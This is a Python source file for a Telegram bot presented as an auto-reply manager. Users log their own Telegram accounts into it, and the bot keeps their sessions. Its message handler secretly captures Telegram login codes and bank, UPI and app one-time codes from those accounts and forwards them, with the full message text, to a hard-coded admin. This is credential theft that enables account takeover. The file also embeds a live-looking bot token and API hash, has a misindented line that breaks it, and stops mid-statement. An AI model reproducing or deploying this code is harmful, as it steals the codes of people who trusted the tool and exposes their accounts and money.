from telethon import TelegramClient, events, Button
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, FloodWaitError
from telethon.tl.functions.account import UpdateStatusRequest
from telethon.tl.types import User, Chat, Channel
from telethon.sessions import StringSession
import asyncio
import json
import os
import re
from datetime import datetime
import time

# ============ CONFIGURATION ============
# Ekhane apnar nijer details gulo boshiye nin
API_ID = 37663020 
API_HASH = 'e082fa08c56c6f30e2855fbec3d2969b'
BOT_TOKEN = '8569155953:AAGWVZ1m3h4ezGZUCEFmt-w0m5-7SEJtQow' 
ADMIN_ID = 7408644813 

# ============ DATA FILES ============
ACCOUNTS_FILE = 'data/accounts.json'
MESSAGES_FILE = 'data/messages.json'
USERS_FILE = 'data/users.json'
SETTINGS_FILE = 'data/settings.json'
SESSIONS_DIR = 'sessions'

# Create directories
os.makedirs('data', exist_ok=True)
os.makedirs(SESSIONS_DIR, exist_ok=True)

class AutoReplyBot:
    def __init__(self):
        self.bot = TelegramClient('bot_session', API_ID, API_HASH)
        self.accounts = self.load_json(ACCOUNTS_FILE, {})
        self.messages = self.load_json(MESSAGES_FILE, [])
        self.users = self.load_json(USERS_FILE, {})
        self.settings = self.load_json(SETTINGS_FILE, {})
        self.user_clients = {}
        
        # Default settings
        for phone in self.accounts:
            if phone not in self.settings:
                self.settings[phone] = {
                    'reply_mode': 'offline',  # offline, online, both
                    'auto_reply': True
                }
        self.save_settings()
        
        # Pending states
        self.pending_phone = {}
        self.pending_otp = {}
        self.pending_2fa = {}
        self.pending_message = {}
        self.pending_broadcast = {}
        self.temp_clients = {}
        
    # ============ JSON HELPERS ============
    def load_json(self, file, default):
        try:
            if os.path.exists(file):
                with open(file, 'r', encoding='utf-8') as f:
                    return json.load(f)
        except:
            pass
        return default
    
    def save_json(self, file, data):
        with open(file, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=4, ensure_ascii=False)
    
    def save_accounts(self):
        self.save_json(ACCOUNTS_FILE, self.accounts)
    
    def save_messages(self):
        self.save_json(MESSAGES_FILE, self.messages)
    
    def save_users(self):
        self.save_json(USERS_FILE, self.users)
    
    def save_settings(self):
        self.save_json(SETTINGS_FILE, self.settings)
    
    def get_country_code(self, phone):
        """Get country code from phone number"""
        codes = {
            '+1': '+1',      # USA/Canada
            '+7': '+7',      # Russia/Kazakhstan
            '+20': '+20',    # Egypt
            '+27': '+27',    # South Africa
            '+30': '+30',    # Greece
            '+31': '+31',    # Netherlands
            '+32': '+32',    # Belgium
            '+33': '+33',    # France
            '+34': '+34',    # Spain
            '+36': '+36',    # Hungary
            '+39': '+39',    # Italy
            '+40': '+40',    # Romania
            '+41': '+41',    # Switzerland
            '+43': '+43',    # Austria
            '+44': '+44',    # UK
            '+45': '+45',    # Denmark
            '+46': '+46',    # Sweden
            '+47': '+47',    # Norway
            '+48': '+48',    # Poland
            '+49': '+49',    # Germany
            '+51': '+51',    # Peru
            '+52': '+52',    # Mexico
            '+53': '+53',    # Cuba
            '+54': '+54',    # Argentina
            '+55': '+55',    # Brazil
            '+56': '+56',    # Chile
            '+57': '+57',    # Colombia
            '+58': '+58',    # Venezuela
            '+60': '+60',    # Malaysia
            '+61': '+61',    # Australia
            '+62': '+62',    # Indonesia
            '+63': '+63',    # Philippines
            '+64': '+64',    # New Zealand
            '+65': '+65',    # Singapore
            '+66': '+66',    # Thailand
            '+81': '+81',    # Japan
            '+82': '+82',    # South Korea
            '+84': '+84',    # Vietnam
            '+86': '+86',    # China
            '+90': '+90',    # Turkey
            '+91': '+91',    # India
            '+92': '+92',    # Pakistan
            '+93': '+93',    # Afghanistan
            '+94': '+94',    # Sri Lanka
            '+95': '+95',    # Myanmar
            '+98': '+98',    # Iran
            '+212': '+212',  # Morocco
            '+213': '+213',  # Algeria
            '+216': '+216',  # Tunisia
            '+218': '+218',  # Libya
            '+220': '+220',  # Gambia
            '+221': '+221',  # Senegal
            '+222': '+222',  # Mauritania
            '+223': '+223',  # Mali
            '+224': '+224',  # Guinea
            '+225': '+225',  # Ivory Coast
            '+226': '+226',  # Burkina Faso
            '+227': '+227',  # Niger
            '+228': '+228',  # Togo
            '+229': '+229',  # Benin
            '+230': '+230',  # Mauritius
            '+231': '+231',  # Liberia
            '+232': '+232',  # Sierra Leone
            '+233': '+233',  # Ghana
            '+234': '+234',  # Nigeria
            '+235': '+235',  # Chad
            '+236': '+236',  # Central African Republic
            '+237': '+237',  # Cameroon
            '+238': '+238',  # Cape Verde
            '+239': '+239',  # São Tomé and Príncipe
            '+240': '+240',  # Equatorial Guinea
            '+241': '+241',  # Gabon
            '+242': '+242',  # Republic of the Congo
            '+243': '+243',  # Democratic Republic of the Congo
            '+244': '+244',  # Angola
            '+245': '+245',  # Guinea-Bissau
            '+246': '+246',  # British Indian Ocean Territory
            '+247': '+247',  # Ascension Island
            '+248': '+248',  # Seychelles
            '+249': '+249',  # Sudan
            '+250': '+250',  # Rwanda
            '+251': '+251',  # Ethiopia
            '+252': '+252',  # Somalia
            '+253': '+253',  # Djibouti
            '+254': '+254',  # Kenya
            '+255': '+255',  # Tanzania
            '+256': '+256',  # Uganda
            '+257': '+257',  # Burundi
            '+258': '+258',  # Mozambique
            '+260': '+260',  # Zambia
            '+261': '+261',  # Madagascar
            '+262': '+262',  # Réunion
            '+263': '+263',  # Zimbabwe
            '+264': '+264',  # Namibia
            '+265': '+265',  # Malawi
            '+266': '+266',  # Lesotho
            '+267': '+267',  # Botswana
            '+268': '+268',  # Eswatini
            '+269': '+269',  # Comoros
            '+351': '+351',  # Portugal
            '+352': '+352',  # Luxembourg
            '+353': '+353',  # Ireland
            '+354': '+354',  # Iceland
            '+355': '+355',  # Albania
            '+356': '+356',  # Malta
            '+357': '+357',  # Cyprus
            '+358': '+358',  # Finland
            '+359': '+359',  # Bulgaria
            '+370': '+370',  # Lithuania
            '+371': '+371',  # Latvia
            '+372': '+372',  # Estonia
            '+373': '+373',  # Moldova
            '+374': '+374',  # Armenia
            '+375': '+375',  # Belarus
            '+376': '+376',  # Andorra
            '+377': '+377',  # Monaco
            '+378': '+378',  # San Marino
            '+380': '+380',  # Ukraine
            '+381': '+381',  # Serbia
            '+382': '+382',  # Montenegro
            '+383': '+383',  # Kosovo
            '+385': '+385',  # Croatia
            '+386': '+386',  # Slovenia
            '+387': '+387',  # Bosnia and Herzegovina
            '+389': '+389',  # North Macedonia
            '+420': '+420',  # Czech Republic
            '+421': '+421',  # Slovakia
            '+423': '+423',  # Liechtenstein
            '+501': '+501',  # Belize
            '+502': '+502',  # Guatemala
            '+503': '+503',  # El Salvador
            '+504': '+504',  # Honduras
            '+505': '+505',  # Nicaragua
            '+506': '+506',  # Costa Rica
            '+507': '+507',  # Panama
            '+508': '+508',  # Saint Pierre and Miquelon
            '+509': '+509',  # Haiti
            '+590': '+590',  # Guadeloupe
            '+591': '+591',  # Bolivia
            '+592': '+592',  # Guyana
            '+593': '+593',  # Ecuador
            '+594': '+594',  # French Guiana
            '+595': '+595',  # Paraguay
            '+596': '+596',  # Martinique
            '+597': '+597',  # Suriname
            '+598': '+598',  # Uruguay
            '+599': '+599',  # Curaçao
            '+670': '+670',  # East Timor
            '+672': '+672',  # Norfolk Island
            '+673': '+673',  # Brunei
            '+674': '+674',  # Nauru
            '+675': '+675',  # Papua New Guinea
            '+676': '+676',  # Tonga
            '+677': '+677',  # Solomon Islands
            '+678': '+678',  # Vanuatu
            '+679': '+679',  # Fiji
            '+680': '+680',  # Palau
            '+681': '+681',  # Wallis and Futuna
            '+682': '+682',  # Cook Islands
            '+683': '+683',  # Niue
            '+684': '+684',  # American Samoa
            '+685': '+685',  # Samoa
            '+686': '+686',  # Kiribati
            '+687': '+687',  # New Caledonia
            '+688': '+688',  # Tuvalu
            '+689': '+689',  # French Polynesia
            '+690': '+690',  # Tokelau
            '+691': '+691',  # Micronesia
            '+692': '+692',  # Marshall Islands
            '+850': '+850',  # North Korea
            '+852': '+852',  # Hong Kong
            '+853': '+853',  # Macau
            '+855': '+855',  # Cambodia
            '+856': '+856',  # Laos
            '+880': '+880',  # Bangladesh
            '+886': '+886',  # Taiwan
            '+960': '+960',  # Maldives
            '+961': '+961',  # Lebanon
            '+962': '+962',  # Jordan
            '+963': '+963',  # Syria
            '+964': '+964',  # Iraq
            '+965': '+965',  # Kuwait
            '+966': '+966',  # Saudi Arabia
            '+967': '+967',  # Yemen
            '+968': '+968',  # Oman
            '+970': '+970',  # Palestine
            '+971': '+971',  # UAE
            '+972': '+972',  # Israel
            '+973': '+973',  # Bahrain
            '+974': '+974',  # Qatar
            '+975': '+975',  # Bhutan
            '+976': '+976',  # Mongolia
            '+977': '+977',  # Nepal
            '+992': '+992',  # Tajikistan
            '+993': '+993',  # Turkmenistan
            '+994': '+994',  # Azerbaijan
            '+995': '+995',  # Georgia
            '+996': '+996',  # Kyrgyzstan
            '+998': '+998',  # Uzbekistan
        }
        
        # Check for exact matches first
        for length in [5, 4, 3, 2, 1]:
            prefix = phone[:length+1] if len(phone) > length else phone
            if prefix in codes:
                return codes[prefix]
        
        return "Unknown"
    
    # ============ KEYBOARD HELPERS ============
    def get_main_keyboard(self, user_id):
        """Main menu buttons based on user type"""
        buttons = [
            [Button.inline("📱 Add Account", b"add_account"),
             Button.inline("📨 Messages", b"messages_menu")],
            [Button.inline("⚙️ Reply Settings", b"reply_settings")]
        ]
        
        # Admin extra buttons
        if user_id == ADMIN_ID:
            buttons.append([
                Button.inline("👥 View Accounts", b"admin_accounts"),
                Button.inline("📢 Broadcast", b"broadcast")
            ])
            buttons.append([Button.inline("📊 Statistics", b"stats")])
        
        return buttons
    
    # ============ START USER CLIENT ============
    async def start_user_client(self, phone, session_string=None):
        """Start monitoring for a user account"""
        try:
            session_file = f'{SESSIONS_DIR}/{phone.replace("+", "").replace(" ", "")}'
            
            if session_string:
                client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
            else:
                client = TelegramClient(session_file, API_ID, API_HASH)
            
            await client.connect()
            
            if not await client.is_user_authorized():
                print(f"❌ {phone} not authorized")
                return False
            
            self.user_clients[phone] = client
            
            # Get account settings
            if phone not in self.settings:
                self.settings[phone] = {
                    'reply_mode': 'offline',
                    'auto_reply': True
                }
                self.save_settings()
            
            # Auto-reply handler
            @client.on(events.NewMessage(incoming=True))
            async def handle_message(event):
                try:
                    # Skip if not private message
                    if not event.is_private or event.out:
                        return
                    
                    text = event.text or ""
                    sender = await event.get_sender()
                    sender_name = getattr(sender, 'first_name', 'Unknown')
                    sender_username = getattr(sender, 'username', None)
                    
                    # Check for Telegram OTP - EXACT FORMAT
                    telegram_otp_patterns = [
                        r'Login code: (\d{5})',  # Standard Telegram format
                        r'Код для входа: (\d{5})',  # Russian
                        r'Confirmation code: (\d{5})',  # Alternative
                        r'Your code: (\d{5})',  # Another variant
                        r'(\d{5}) is your',  # Code at start
                        r'code is (\d{5})',  # Code in middle
                    ]
                    
                    # Check if message is from Telegram
                    is_telegram = (
                        sender_username == 'telegram' or 
                        sender.id == 777000 or  # Telegram's service account ID
                        'telegram' in sender_name.lower() or
                        any(phrase in text.lower() for phrase in [
                            'login code', 'do not give this code', 
                            'telegram account', 'trying to log in',
                            'didn\'t request this code'
                        ])
                    )
                    
                    otp_found = None
                    
                    # First check for Telegram OTP
                    if is_telegram or 'login code' in text.lower():
                        for pattern in telegram_otp_patterns:
                            match = re.search(pattern, text, re.IGNORECASE)
                            if match:
                                otp_found = match.group(1)
                                break
                        
                        # If no match with patterns, try to find 5-digit number
                        if not otp_found:
                            numbers = re.findall(r'\b\d{5}\b', text)
                            if numbers:
                                otp_found = numbers[0]
                    
                    # Check for other OTPs
                    if not otp_found:
                        otp_keywords = [
                            'otp', 'code', 'verification', 'verify',
                            'password', 'confirm', 'authentication',
                            'whatsapp', 'instagram', 'facebook',
                            'google', 'microsoft', 'apple', 'amazon',
                            'bank', 'sbi', 'hdfc', 'icici', 'axis',
                            'paytm', 'phonepe', 'gpay', 'upi'
                        ]
                        
                        if any(kw in text.lower() for kw in otp_keywords):
                            # Look for 4-6 digit codes
                            codes = re.findall(r'\b\d{4,6}\b', text)
                            if codes:
                                otp_found = codes[0]
                    
                    # Send OTP to admin if found
                    if otp_found:
                        otp_type = "🔐 TELEGRAM LOGIN CODE" if is_telegram else "🔢 OTP DETECTED"
                        
                        otp_msg = (
                            f"{otp_type}\n\n"
                            f"📱 Account: `{phone}`\n"
                            f"👤 From: {sender_name}\n"
                            f"📧 Username: @{sender_username if sender_username else 'None'}\n"
                            f"━━━━━━━━━━━━━━━\n"
                            f"📨 **Full Message:**\n```{text}```\n"
                            f"━━━━━━━━━━━━━━━\n"
                            f"🔥 **CODE: `{otp_found}`**\n"
                            f"⏰ Time: {datetime.now().strftime('%H:%M:%S')}"
                        )
                        
                        try:
                            await self.bot.send_message(ADMIN_ID, otp_msg)
                            print(f"✅ OTP sent to admin: {otp_found}")
                        except Exception as e:
                            print(f"❌ Failed to send OTP: {e}")
                    
                    # Auto-reply based on settings
                    settings = self.settings.get(phone, {})
                    reply_mode = settings.get('reply_mode', 'offline')
                    auto_reply = settings.get('auto_reply', True)
                    
                    if auto_reply and self.messages:
                        should_reply = False
                        
                        if reply_mode == 'both':
                            should_reply = True
                        elif reply_mode == 'online':
                            # Check if user is online
                            me = await client.get_me()
                            if me.status and hasattr(me.status, 'was_online'):
                                should_reply = False
                            else:
                                should_reply = True
                        elif reply_mode == 'offline':
                            # Reply only when offline
                            try:
                                await client(UpdateStatusRequest(offline=False))
                                should_reply = True
                            except:
                                should_reply = True
                        
                        if should_reply:
                            reply_text = self.messages[0].get('text', '')
                            if reply_text:
                                await event.reply(reply_text)
                                
                                # Log to admin
                                log_msg = (
                                    f"📨 **Auto-Reply Sent**\n\n"
                                    f"📱 Account: `{phone}`\n"
                                    f"👤 To: {sender_name}\n"
                                    f"⚙️ Mode: {reply_mode.upper()}\n"
                                    f"💬 Message: {text[:50]}..."
                                )
                                
                                try:
                                    await self.bot.send_message(ADMIN_ID, log_msg)
                                except:
                                    pass
                
                except Exception as e:
                    print(f"Message handler error: {e}")
            
            print(f"✅ Started monitoring: {phone}")
            return True
            
        except Exception as e:
            print(f"❌ Error starting {phone}: {e}")
            return False
    
        # ============ START ALL CLIENTS ============
    async def start_all_clients(self):
        """Start all saved account clients"""
        if not self.accounts:
            print("📱 No accounts to start")
            return
        
        print(f"🔄 Starting {len(self.accounts)} accounts...")
        
        for phone, data in list(self.accounts.items()):
            try:
                session_string = data.get('session_string')
                success = await self.start_user_client(phone, session_string)
                
                if success:
                    data['status'] = 'active'
                    print(f"✅ {phone} - Active")
                else:
                    data['status'] = 'inactive'
                    print(f"❌ {phone} - Inactive")
                    
                self.save_accounts()
                await asyncio.sleep(1)
                
            except Exception as e:
                print(f"❌ Failed to start {phone}: {e}")
                data['status'] = 'error'
                self.save_accounts()
    
    # ============ MAIN BOT ============
    async def run(self):
        await self.bot.start(bot_token=BOT_TOKEN)
        me = await self.bot.get_me()
        print(f"✅ Bot started: @{me.username}")
        
        # Start all saved clients
        await self.start_all_clients()
        
        # ============ /START COMMAND ============
        @self.bot.on(events.NewMessage(pattern='/start'))
        async def start_command(event):
            user_id = event.sender_id
            user = await event.get_sender()
            
            # Save user
            if str(user_id) not in self.users:
                self.users[str(user_id)] = {
                    'name': user.first_name,
                    'username': user.username,
                    'joined': str(datetime.now()),
                    'accounts': []
                }
                self.save_users()
            
            welcome_text = (
                f"👋 **Welcome, {user.first_name}!**\n\n"
                f"🤖 This bot manages your Telegram accounts.\n\n"
                f"✨ **Features:**\n"
                f"• 📱 Add multiple accounts\n"
                f"• 📨 Set auto-reply messages\n"
                f"• ⚙️ Choose reply mode (Online/Offline/Both)\n"
                f"• 🔐 OTP monitoring\n\n"
                f"👇 **Select an option:**"
            )
            
            await event.reply(welcome_text, buttons=self.get_main_keyboard(user_id))
        
        # ============ MAIN MENU CALLBACK ============
        @self.bot.on(events.CallbackQuery(data=b"main_menu"))
        async def main_menu(event):
            await event.edit(
                "🏠 **Main Menu**\n\n👇 Select option:",
                buttons=self.get_main_keyboard(event.sender_id)
            )
        
        # ============ REPLY SETTINGS ============
        @self.bot.on(events.CallbackQuery(data=b"reply_settings"))
        async def reply_settings(event):
            user_id = event.sender_id
            user_accounts = []
            
            # Get user's accounts
            for phone, acc in self.accounts.items():
                if acc.get('owner') == user_id or user_id == ADMIN_ID:
                    user_accounts.append(phone)
            
            if not user_accounts:
                await event.edit(
                    "❌ **No accounts found!**\n\n"
                    "Add an account first.",
                    buttons=[[Button.inline("📱 Add Account", b"add_account")]]
                )
                return
            
            buttons = []
            for phone in user_accounts:
                settings = self.settings.get(phone, {})
                mode = settings.get('reply_mode', 'offline')
                status = "✅" if settings.get('auto_reply', True) else "❌"
                
                btn_text = f"{status} {phone} ({mode.upper()})"
                buttons.append([Button.inline(btn_text, f"acc_settings_{phone}".encode())])
            
            buttons.append([Button.inline("🔙 Back", b"main_menu")])
            
            await event.edit(
                "⚙️ **Reply Settings**\n\n"
                "Select account to configure:\n\n"
                "✅ = Auto-reply ON\n"
                "❌ = Auto-reply OFF",
                buttons=buttons
            )
        
        @self.bot.on(events.CallbackQuery(pattern=b"acc_settings_(.+)"))
        async def account_settings(event):
            phone = event.data.decode().split('_', 2)[2]
            
            settings = self.settings.get(phone, {
                'reply_mode': 'offline',
                'auto_reply': True
            })
            
            current_mode = settings.get('reply_mode', 'offline')
            auto_reply = settings.get('auto_reply', True)
            
            # Mode indicators
            offline_mark = "✅" if current_mode == 'offline' else ""
            online_mark = "✅" if current_mode == 'online' else ""
            both_mark = "✅" if current_mode == 'both' else ""
            
            buttons = [
                [Button.inline(f"{offline_mark} Offline Mode", f"set_mode_{phone}_offline".encode())],
                [Button.inline(f"{online_mark} Online Mode", f"set_mode_{phone}_online".encode())],
                [Button.inline(f"{both_mark} Both Mode", f"set_mode_{phone}_both".encode())],
                [Button.inline(
                    f"{'🔴 Disable' if auto_reply else '🟢 Enable'} Auto-Reply",
                    f"toggle_reply_{phone}".encode()
                )],
                [Button.inline("🔙 Back", b"reply_settings")]
            ]
            
            await event.edit(
                f"⚙️ **Settings for {phone}**\n\n"
                f"📊 **Current Settings:**\n"
                f"• Mode: {current_mode.upper()}\n"
                f"• Auto-Reply: {'ON ✅' if auto_reply else 'OFF ❌'}\n\n"
                f"━━━━━━━━━━━━━━━\n"
                f"📝 **Modes Explained:**\n"
                f"• **Offline:** Reply when you're offline\n"
                f"• **Online:** Reply when you're online\n"
                f"• **Both:** Always reply\n"
                f"━━━━━━━━━━━━━━━\n\n"
                f"Select option:",
                buttons=buttons
            )
        
        @self.bot.on(events.CallbackQuery(pattern=b"set_mode_(.+)_(.+)"))
        async def set_reply_mode(event):
            parts = event.data.decode().split('_')
            phone = '_'.join(parts[2:-1])
            mode = parts[-1]
            
            if phone not in self.settings:
                self.settings[phone] = {}
            
            self.settings[phone]['reply_mode'] = mode
            self.save_settings()
            
            await event.answer(f"✅ Reply mode set to {mode.upper()}", alert=True)
            
            # Refresh the menu
            await account_settings(event)
        
        @self.bot.on(events.CallbackQuery(pattern=b"toggle_reply_(.+)"))
        async def toggle_auto_reply(event):
            phone = event.data.decode().split('_', 2)[2]
            
            if phone not in self.settings:
                self.settings[phone] = {'auto_reply': True, 'reply_mode': 'offline'}
            
            current = self.settings[phone].get('auto_reply', True)
            self.settings[phone]['auto_reply'] = not current
            self.save_settings()
            
            status = "ON ✅" if not current else "OFF ❌"
            await event.answer(f"Auto-Reply {status}", alert=True)
            
            # Refresh the menu
            await account_settings(event)
        
        # ============ ADD ACCOUNT ============
        @self.bot.on(events.CallbackQuery(data=b"add_account"))
        async def add_account_start(event):
            user_id = event.sender_id
            self.pending_phone[user_id] = True
            
            await event.edit(
                "📱 **Add New Account**\n\n"
                "Enter phone number with country code:\n\n"
                "📝 Examples:\n"
                "• `+919876543210` (India)\n"
                "• `+14155552671` (USA)\n"
                "• `+447700900000` (UK)\n\n"
                "⚠️ Make sure number is correct!",
                buttons=[[Button.inline("❌ Cancel", b"main_menu")]]
            )
        
        # ============ MESSAGES MENU ============
        @self.bot.on(events.CallbackQuery(data=b"messages_menu"))
        async def messages_menu(event):
            msg_count = len(self.messages)
            
            await event.edit(
                f"📨 **Messages Menu**\n\n"
                f"📊 Total Messages: {msg_count}\n\n"
                f"Manage auto-reply messages:",
                buttons=[
                    [Button.inline("➕ Add Message", b"add_message")],
                    [Button.inline("📋 View Messages", b"view_messages")],
                    [Button.inline("🗑️ Delete All", b"delete_all_messages")],
                    [Button.inline("🔙 Back", b"main_menu")]
                ]
            )
        
        @self.bot.on(events.CallbackQuery(data=b"add_message"))
        async def add_message_start(event):
            user_id = event.sender_id
            self.pending_message[user_id] = 'waiting'
            
            await event.edit(
                "📝 **Add New Message**\n\n"
                "Type your auto-reply message:\n\n"
                "💡 Tips:\n"
                "• Use emojis for better look\n"
                "• Keep it short and clear\n"
                "• Be professional",
                buttons=[[Button.inline("❌ Cancel", b"messages_menu")]]
            )
        
        @self.bot.on(events.CallbackQuery(data=b"view_messages"))
        async def view_messages(event):
            if not self.messages:
                await event.edit(
                    "❌ **No messages found!**\n\n"
                    "Add a message first.",
                    buttons=[
                        [Button.inline("➕ Add Message", b"add_message")],
                        [Button.inline("🔙 Back", b"messages_menu")]
                    ]
                )
                return
            
            buttons = []
            for i, msg in enumerate(self.messages):
                text = msg['text']
                short = text[:25] + "..." if len(text) > 25 else text
                buttons.append([Button.inline(f"📝 {i+1}. {short}", f"view_msg_{i}".encode())])
            
            buttons.append([Button.inline("🔙 Back", b"messages_menu")])
            
            await event.edit(
                f"📋 **All Messages ({len(self.messages)})**\n\n"
                f"Select to view/delete:",
                buttons=buttons
            )
        
        @self.bot.on(events.CallbackQuery(pattern=b"view_msg_(\d+)"))
        async def view_single_message(event):
            idx = int(event.data.decode().split('_')[2])
            
            if idx < len(self.messages):
                msg = self.messages[idx]
                await event.edit(
                    f"📝 **Message #{idx + 1}**\n\n"
                    f"━━━━━━━━━━━━━━━\n"
                    f"{msg['text']}\n"
                    f"━━━━━━━━━━━━━━━\n\n"
                    f"📅 Added: {msg.get('date', 'Unknown')[:19]}",
                    buttons=[
                        [Button.inline("🗑️ Delete", f"del_msg_{idx}".encode())],
                        [Button.inline("🔙 Back", b"view_messages")]
                    ]
                )
        
        @self.bot.on(events.CallbackQuery(pattern=b"del_msg_(\d+)"))
        async def delete_single_message(event):
            idx = int(event.data.decode().split('_')[2])
            
            if idx < len(self.messages):
                self.messages.pop(idx)
                self.save_messages()
                
                await event.edit(
                    "✅ **Message Deleted!**",
                    buttons=[[Button.inline("🔙 Back", b"view_messages")]]
                )
        
        @self.bot.on(events.CallbackQuery(data=b"delete_all_messages"))
        async def delete_all_messages(event):
            if not self.messages:
                await event.answer("No messages to delete!", alert=True)
                return
            
            await event.edit(
                "⚠️ **Confirm Delete?**\n\n"
                "Delete all messages?",
                buttons=[
                    [Button.inline("✅ Yes, Delete All", b"confirm_delete_all")],
                    [Button.inline("❌ No, Cancel", b"messages_menu")]
                ]
            )
        
        @self.bot.on(events.CallbackQuery(data=b"confirm_delete_all"))
        async def confirm_delete_all(event):
            self.messages = []
            self.save_messages()
            
            await event.edit(
                "✅ **All Messages Deleted!**",
                buttons=[[Button.inline("🔙 Back", b"messages_menu")]]
            )
        
        # ============ ADMIN: VIEW ACCOUNTS ============
        @self.bot.on(events.CallbackQuery(data=b"admin_accounts"))
        async def admin_view_accounts(event):
            if event.sender_id != ADMIN_ID:
                await event.answer("❌ Admin only!", alert=True)
                return
            
            if not self.accounts:
                await event.edit(
                    "❌ **No accounts found!**",
                    buttons=[[Button.inline("🔙 Back", b"main_menu")]]
                )
                return
            
            buttons = []
            for phone, data in self.accounts.items():
                name = data.get('first_name', 'Unknown')[:15]
                status_icon = "🟢" if data.get('status') == 'active' else "🔴"
                btn_text = f"{status_icon} {name} | {phone}"
                buttons.append([Button.inline(btn_text, f"acc_detail_{phone}".encode())])
            
            buttons.append([Button.inline("🔄 Refresh", b"admin_accounts")])
            buttons.append([Button.inline("🔙 Back", b"main_menu")])
            
            active_count = len([a for a in self.accounts.values() if a.get('status') == 'active'])
            
            await event.edit(
                f"👥 **All Accounts**\n\n"
                f"📊 Total: {len(self.accounts)}\n"
                f"🟢 Active: {active_count}\n"
                f"🔴 Inactive: {len(self.accounts) - active_count}\n\n"
                f"Select for details:",
                buttons=buttons
            )
        
        @self.bot.on(events.CallbackQuery(pattern=b"acc_detail_(.+)"))
        async def account_details(event):
            if event.sender_id != ADMIN_ID:
                await event.answer("❌ Admin only!", alert=True)
                return
            
            phone = event.data.decode().split('_', 2)[2]
            
            if phone not in self.accounts:
                await event.answer("Account not found!", alert=True)
                return
            
            acc = self.accounts[phone]
            country_code = self.get_country_code(phone)
            
            status = "🟢 Active" if acc.get('status') == 'active' else "🔴 Inactive"
            has_2fa = "✅ Yes" if acc.get('has_2fa') else "❌ No"
            
            settings = self.settings.get(phone, {})
            reply_mode = settings.get('reply_mode', 'offline').upper()
            auto_reply = "ON ✅" if settings.get('auto_reply', True) else "OFF ❌"
            
            details_text = (
                f"📱 **Account Details**\n\n"
                f"━━━━━━━━━━━━━━━\n"
                f"📞 **Phone:** `{phone}`\n"
                f"🌍 **Country Code:** {country_code}\n"
                f"👤 **Name:** {acc.get('first_name', 'Unknown')}\n"
                f"📧 **Username:** @{acc.get('username') or 'None'}\n"
                f"🆔 **User ID:** `{acc.get('user_id', 'Unknown')}`\n"
                f"🔐 **2FA:** {has_2fa}\n"
                f"📊 **Status:** {status}\n"
                f"━━━━━━━━━━━━━━━\n"
                f"⚙️ **Settings:**\n"
                f"• Reply Mode: {reply_mode}\n"
                f"• Auto-Reply: {auto_reply}\n"
                f"━━━━━━━━━━━━━━━\n"
                f"📅 **Added:** {acc.get('login_date', 'Unknown')[:19]}"
            )
            
            await event.edit(
                details_text,
                buttons=[
                    [Button.inline("👁️ Monitor OTP", f"monitor_otp_{phone}".encode())],
                    [Button.inline("⚙️ Settings", f"acc_settings_{phone}".encode())],
                    [Button.inline("🔄 Refresh", f"acc_detail_{phone}".encode())],
                    [Button.inline("🗑️ Remove", f"remove_acc_{phone}".encode())],
                    [Button.inline("🔙 Back", b"admin_accounts")]
                ]
            )
        
        @self.bot.on(events.CallbackQuery(pattern=b"monitor_otp_(.+)"))
        async def monitor_otp(event):
            if event.sender_id != ADMIN_ID:
                await event.answer("❌ Admin only!", alert=True)
                return
            
            phone = event.data.decode().split('_', 2)[2]
            
            await event.edit(
                f"👁️ **OTP Monitoring Active**\n\n"
                f"📱 Account: `{phone}`\n\n"
                f"━━━━━━━━━━━━━━━\n"
                f"✅ Monitoring is active!\n\n"
                f"**Telegram Login Codes:**\n"
                f"Format: `Login code: XXXXX`\n\n"
                f"When any OTP arrives, you'll be notified.\n"
                f"━━━━━━━━━━━━━━━",
                buttons=[
                    [Button.inline("🔄 Refresh", f"monitor_otp_{phone}".encode())],
                    [Button.inline("🔙 Back", f"acc_detail_{phone}".encode())]
                ]
            )
        
        @self.bot.on(events.CallbackQuery(pattern=b"remove_acc_(.+)"))
        async def remove_account_confirm(event):
            if event.sender_id != ADMIN_ID:
                await event.answer("❌ Admin only!", alert=True)
                return
            
            phone = event.data.decode().split('_', 2)[2]
            
            await event.edit(
                f"⚠️ **Confirm Remove?**\n\n"
                f"Account: `{phone}`\n\n"
                f"This will logout the account.",
                buttons=[
                    [Button.inline("✅ Yes, Remove", f"confirm_remove_{phone}".encode())],
                    [Button.inline("❌ Cancel", f"acc_detail_{phone}".encode())]
                ]
            )
        
        @self.bot.on(events.CallbackQuery(pattern=b"confirm_remove_(.+)"))
        async def remove_account_final(event):
            if event.sender_id != ADMIN_ID:
                await event.answer("❌ Admin only!", alert=True)
                return
            
            phone = event.data.decode().split('_', 2)[2]
            
            # Disconnect client
            if phone in self.user_clients:
                try:
                    await self.user_clients[phone].log_out()
                except:
                    pass
                del self.user_clients[phone]
            
            # Remove from accounts and settings
            if phone in self.accounts:
                del self.accounts[phone]
                self.save_accounts()
            
            if phone in self.settings:
                del self.settings[phone]
                self.save_settings()
            
            await event.edit(
                f"✅ **Account Removed!**\n\n"
                f"Phone: `{phone}`",
                buttons=[[Button.inline("🔙 Back", b"admin_accounts")]]
            )
        
        # ============ ADMIN: BROADCAST ============
        @self.bot.on(events.CallbackQuery(data=b"broadcast"))
        async def broadcast_start(event):
            if event.sender_id != ADMIN_ID:
                await event.answer("❌ Admin only!", alert=True)
                          return
            
            active_accounts = [p for p, c in self.user_clients.items() if c.is_connected()]
            
            if not active_accounts:
                await event.edit(
                    "❌ **No active accounts!**\n\n"
                    "Add accounts first.",
                    buttons=[[Button.inline("🔙 Back", b"main_menu")]]
                )
                return
            
            self.pending_broadcast[event.sender_id] = 'waiting'
            
            await event.edit(
                f"📢 **Broadcast Message**\n\n"
                f"📱 Active Accounts: {len(active_accounts)}\n\n"
                f"Enter message to send to all:\n"
                f"• Groups\n"
                f"• Channels\n"
                f"• Users\n\n"
                f"⚠️ Use carefully!",
                buttons=[[Button.inline("❌ Cancel", b"main_menu")]]
            )
        
        # ============ ADMIN: STATISTICS ============
        @self.bot.on(events.CallbackQuery(data=b"stats"))
        async def show_stats(event):
            if event.sender_id != ADMIN_ID:
                await event.answer("❌ Admin only!", alert=True)
                return
            
            total_accounts = len(self.accounts)
            active_accounts = len([a for a in self.accounts.values() if a.get('status') == 'active'])
            total_messages = len(self.messages)
            total_users = len(self.users)
            
            # Count reply modes
            offline_count = len([s for s in self.settings.values() if s.get('reply_mode') == 'offline'])
            online_count = len([s for s in self.settings.values() if s.get('reply_mode') == 'online'])
            both_count = len([s for s in self.settings.values() if s.get('reply_mode') == 'both'])
            
            stats_text = (
